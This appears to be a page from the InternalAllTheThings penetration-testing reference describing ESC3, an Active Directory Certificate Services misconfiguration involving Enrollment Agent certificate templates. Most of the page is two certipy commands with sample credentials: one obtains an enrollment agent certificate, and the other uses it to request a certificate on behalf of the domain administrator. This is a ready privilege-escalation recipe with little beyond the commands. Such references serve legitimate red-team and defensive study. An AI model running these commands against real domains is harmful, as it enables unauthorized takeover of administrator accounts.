---
title: "Active Directory - Certificate ESC3"
section: "Active Directory"
sectionSlug: "active-directory"
sourcePath: "docs/active-directory/ad-adcs-esc03.md"
sourceUrl: "https://github.com/swisskyrepo/InternalAllTheThings/blob/e891850d6bc6/docs/active-directory/ad-adcs-esc03.md"
sha: "e891850d6bc6"
isIndex: false
---

# Active Directory - Certificate ESC3

## ESC3 - Misconfigured Enrollment Agent Templates

> ESC3 is when a certificate template specifies the Certificate Request Agent EKU (Enrollment Agent). This EKU can be used to request certificates on behalf of other users

* Request a certificate based on the vulnerable certificate template ESC3.

  ```ps1
  $ certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC3'
  [*] Saved certificate and private key to 'john.pfx'
  ```

* Use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user

  ```ps1
  certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'
  ```

## References
